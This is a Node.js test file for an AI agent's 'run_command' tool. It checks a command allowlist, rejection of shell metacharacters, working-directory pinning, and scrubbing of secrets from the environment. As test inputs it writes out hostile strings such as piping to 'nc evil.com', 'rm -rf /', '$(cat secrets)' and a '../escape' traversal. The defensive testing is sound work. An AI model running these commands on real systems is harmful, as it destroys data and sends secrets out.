'use strict';
// Phase 3 (V7) regression: the run_command effector enforces its 5-layer
// safety model (allowlist, shell-metachar reject, cwd pinning, env scrub,
// timeout) before delegating the subprocess lifecycle to the adapter. These
// tests exercise the effector layer in isolation (no real subprocess spawn
// except where the test asserts a real one), so they're fast + deterministic.
const { describe, it, before, after } = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');

const { tempVaultDir, cleanupVaultDir } = require('./helpers');
const { createFsStore } = require('../src/core/memory/fs-store');
const {
  buildTools, parseAllowlist, hasShellMetachar, scrubEnv, resolveCwd
} = require('../src/core/effectors/from-runner');
const { createEffectorHub } = require('../src/core/effectors/hub');
const { registerFromRunner } = require('../src/core/effectors/from-runner');
const { tierOf, TIER_TABLE } = require('../src/core/leash/tiers');

describe('Phase 3 (V7) run_command — safety helpers', () => {
  it('parseAllowlist: semicolon-between-commands, colon+comma for flags', () => {
    var map = parseAllowlist('npm:test,install;node:--version;git');
    assert.equal(map.size, 3);
    assert.ok(map.get('npm').has('test'));
    assert.ok(map.get('npm').has('--test'));   // normalized
    assert.ok(map.get('npm').has('install'));
    assert.ok(map.get('node').has('--version'));
    assert.equal(map.get('git').size, 0);      // no colon = any args
  });

  it('parseAllowlist: empty input → empty map (tool disabled, fail-closed)', () => {
    assert.equal(parseAllowlist('').size, 0);
    assert.equal(parseAllowlist(null).size, 0);
    assert.equal(parseAllowlist(undefined).size, 0);
  });

  it('hasShellMetachar: rejects shell expansion + redirection + sequencing', () => {
    assert.ok(hasShellMetachar('$(cat secrets)'));
    assert.ok(hasShellMetachar('`whoami`'));
    assert.ok(hasShellMetachar('foo > /etc/passwd'));
    assert.ok(hasShellMetachar('foo | nc evil.com'));
    assert.ok(hasShellMetachar('foo; rm -rf /'));
    assert.ok(hasShellMetachar('foo && bar'));
    assert.ok(hasShellMetachar('foo\nbar'));
    assert.ok(hasShellMetachar('~/secrets'));
  });

  it('hasShellMetachar: allows normal args + file paths + flag values', () => {
    assert.ok(!hasShellMetachar('test'));
    assert.ok(!hasShellMetachar('--version'));
    assert.ok(!hasShellMetachar('test.js'));
    assert.ok(!hasShellMetachar('./builds/projects/foo'));
    assert.ok(!hasShellMetachar('-y'));
  });

  it('scrubEnv: strips API keys, secrets, tokens, GOOGLE_*, MYTHOS_* (except identity)', () => {
    var env = scrubEnv({
      PATH: '/usr/bin',
      HOME: '/home/op',
      GROQ_API_KEY: 'gk_xxx',
      MISTRAL_API_KEY: 'mk_xxx',
      GOOGLE_REFRESH_TOKEN: '1/yyy',
      GOOGLE_CLIENT_SECRET: 'secret',
      MYTHOS_PORT: '4478',         // identity-only — kept
      MYTHOS_VAULT_ROOT: './vault', // identity-only — kept
      MYTHOS_DRY_RUN: 'true',      // not identity — stripped
      EXA_API_KEY: 'exa_zzz',
      HERMES_API_KEY: 'hk',
      USERPROFILE: 'C:\\Users\\op',
      NODE_PATH: '/usr/lib/node_modules'
    });
    assert.equal(env.PATH, '/usr/bin');
    assert.equal(env.HOME, '/home/op');
    assert.equal(env.USERPROFILE, 'C:\\Users\\op');
    assert.equal(env.NODE_PATH, '/usr/lib/node_modules');   // ambient, kept
    assert.equal(env.MYTHOS_PORT, '4478');                  // identity-keep
    assert.equal(env.MYTHOS_VAULT_ROOT, './vault');         // identity-keep
    assert.ok(!('GROQ_API_KEY' in env));
    assert.ok(!('MISTRAL_API_KEY' in env));
    assert.ok(!('GOOGLE_REFRESH_TOKEN' in env));
    assert.ok(!('GOOGLE_CLIENT_SECRET' in env));
    assert.ok(!('MYTHOS_DRY_RUN' in env));
    assert.ok(!('EXA_API_KEY' in env));
    assert.ok(!('HERMES_API_KEY' in env));
  });

  it('resolveCwd: project + engagement + default, with traversal guard', () => {
    var dir = tempVaultDir();
    try {
      var vault = createFsStore(() => dir, null);
      var p = resolveCwd(vault, { projectSlug: 'foo' });
      var e = resolveCwd(vault, { engagementId: 'eng-1' });
      var d = resolveCwd(vault, {});
      assert.ok(p.indexOf(path.join('builds', 'projects', 'foo')) !== -1);
      assert.ok(e.indexOf(path.join('builds', 'engagements', 'eng-1')) !== -1);
      assert.ok(d.indexOf(path.join('builds')) !== -1);
      assert.ok(p.indexOf(dir) === 0);    // never escapes vault
      assert.throws(function () { resolveCwd(vault, { projectSlug: '../escape' }); }, /illegal path segment/);
      assert.throws(function () { resolveCwd(vault, { projectSlug: 'a/b' }); }, /illegal path segment/);
    } finally { cleanupVaultDir(dir); }
  });
});

describe('Phase 3 (V7) run_command — effector layer (no subprocess)', () => {
  let dir;
  after(() => { if (dir) cleanupVaultDir(dir); });

  function makeRunner(allowlist) {
    dir = tempVaultDir();
    var vault = createFsStore(() => dir, null);
    var tools = buildTools({ vault: vault, config: { RUN_COMMAND_ALLOWLIST: allowlist || '', RUN_COMMAND_TIMEOUT_MS: 5000 } });
    return { vault: vault, run_command: tools[0].fn };
  }

  it('empty allowlist → fail-closed with the "disabled" message', async () => {
    var r = makeRunner('');
    var out = await r.run_command({ command: 'node', args: ['--version'] });
    assert.equal(out.ok, false);
    assert.ok(/disabled/.test(out.result.error));
  });

  it('unknown command → allowlist-denied', async () => {
    var r = makeRunner('node:--version');
    var out = await r.run_command({ command: 'rm', args: ['-rf'] });
    assert.equal(out.ok, false);
    assert.ok(/allowlist-denied/.test(out.result.error));
  });

  it('disallowed arg flag → allowlist-denied for the flag', async () => {
    var r = makeRunner('node:--version');
    var out = await r.run_command({ command: 'node', args: ['--eval'] });   // --eval NOT in allowlist
    assert.equal(out.ok, false);
    assert.ok(/allowlist-denied/.test(out.result.error));
    assert.ok(/--eval/.test(out.result.error));
  });

  it('shell metachar in arg → rejected before spawn', async () => {
    var r = makeRunner('node:--version;cat');   // cat allowlisted just so flag check passes... actually --version is the only flag
    var out = await r.run_command({ command: 'node', args: ['--version', '$(whoami)'] });
    assert.equal(out.ok, false);
    assert.ok(/shell-metachar-rejected/.test(out.result.error));
  });

  it('allowed command + allowed flag → executes and returns ok with stdout', async () => {
    // Real subprocess — node --version is universally safe + available.
    var r = makeRunner('node:--version');
    var out = await r.run_command({ command: 'node', args: ['--version'], projectSlug: 'test-proj' });
    assert.equal(out.ok, true, 'expected ok, got: ' + JSON.stringify(out));
    assert.ok(out.result.exitCode === 0);
    assert.ok(/v\d+\.\d+/.test(out.result.stdout), 'expected a node version in stdout, got: ' + out.result.stdout);
    // cwd must be pinned inside the vault's builds/projects/<slug>
    assert.ok(out.result.cwd.indexOf(path.join('builds', 'projects', 'test-proj')) !== -1);
  });

  it('failing command (nonzero exit) → ok:false with exit code + stderr captured', async () => {
    var r = makeRunner('node:--eval');   // allowlist --eval
    // node --eval 'process.exit(2)' — nonzero exit, no metachar (no shell expansion)
    var out = await r.run_command({ command: 'node', args: ['--eval', 'process.exit(2)'] });
    assert.equal(out.ok, false);
    assert.ok(/exit 2/.test(out.result.error));
    assert.equal(out.result.exitCode, 2);
  });
});

describe('Phase 3 (V7) run_command — hub registration + tier parity', () => {
  it('registers run_command as a counted T3 effector (count gate is 72, not 71)', () => {
    var dir = tempVaultDir();
    try {
      var vault = createFsStore(() => dir, null);
      var hub = createEffectorHub({ bus: { emit: function () {}, subscribe: function () { return function () {}; } }, config: {} });
      var n = registerFromRunner(hub, { vault: vault, config: {} });
      assert.equal(n.count, 1);
      assert.equal(hub.count(), 1);
      assert.equal(tierOf('run_command'), 3);
      assert.equal(TIER_TABLE.run_command, 3);
    } finally { cleanupVaultDir(dir); }
  });
});
